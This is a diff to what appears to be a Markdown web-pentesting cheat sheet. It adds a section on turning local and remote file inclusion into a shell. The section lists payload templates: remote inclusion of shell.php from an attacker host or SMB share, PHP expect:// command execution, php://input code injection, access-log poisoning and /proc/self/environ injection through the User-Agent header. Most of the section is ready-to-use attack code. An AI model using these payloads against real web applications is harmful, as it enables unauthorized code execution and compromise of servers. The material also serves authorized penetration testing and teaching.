@@ -146,6 +146,50 @@ assetfinder example.com | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)
 
 ---
 
+## **LFI**
+
+### Get shell
+
+**RFI**
+
+```bash
+<target>?page=http://<attacker>/shell.php
+<target>?page=\\<attacker>\<shared_folder>\shell.php
+```
+
+**PHP wrappers**
+
+PHP Expect
+
+```bash
+<target>?page=expect://id
+<target>?page=expect://ls
+```
+
+PHP Input 
+
+Using a proxy like Burp, change the request to a POST request and use the wrapper "php://input", then put your php code into the request body :
+
+Raw Request :
+```php
+POST <targeturi>/<vulnrable_paramter>=php://input
+host: <target>
+
+<?php phpinfo(); ?>
+```
+**access_log**
+
+If you find the access log, you can make a request with your php code 
+
+**proc/self/environ**
+
+Send the payload into User-Agent, and browse the /proc/self/environ file :
+
+```bash
+<target>?page=../../../proc/self/environ HTTP/1.1
+User-Agent: <?php phpinfo(); ?>
+```
+
 ## **Injections**
 
 ### SSTI
